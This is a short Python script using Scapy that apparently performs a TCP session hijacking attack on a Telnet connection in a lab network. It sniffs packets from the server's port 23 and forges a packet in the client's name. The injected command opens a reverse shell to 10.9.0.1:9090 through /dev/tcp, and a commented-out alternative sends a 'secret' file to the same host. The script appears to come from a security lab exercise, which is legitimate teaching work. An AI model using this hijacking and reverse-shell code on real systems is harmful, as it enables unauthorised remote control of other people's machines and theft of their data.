#!/usr/bin/env python3
from scapy.all import *

def spoof_tcp(pkt):
    # sniff server packet
    # pkt[TCP].src sport, pkt[TCP].dport:user
    
    # spoof packet from user to server
    # ip = IP(src="10.9.0.5", dst="10.9.0.6")
    ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
    tcp = TCP(sport=pkt[TCP].dport, 
              dport=pkt[TCP].sport, 
              flags="A", 
              seq=pkt[TCP].ack+5, 
              ack=pkt[TCP].seq+len(pkt[TCP].payload))
    # data = "\r cat secret > /dev/tcp/10.9.0.1/9090 \r"
    data = "\r /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
    pkt = ip/tcp/data
    # ls(pkt)
    send(pkt, iface="br-f7e04cf35ca2", verbose=0)

pkt = sniff(iface='br-f7e04cf35ca2', 
            filter="tcp and src host 10.9.0.5 and src port 23", 
            prn=spoof_tcp)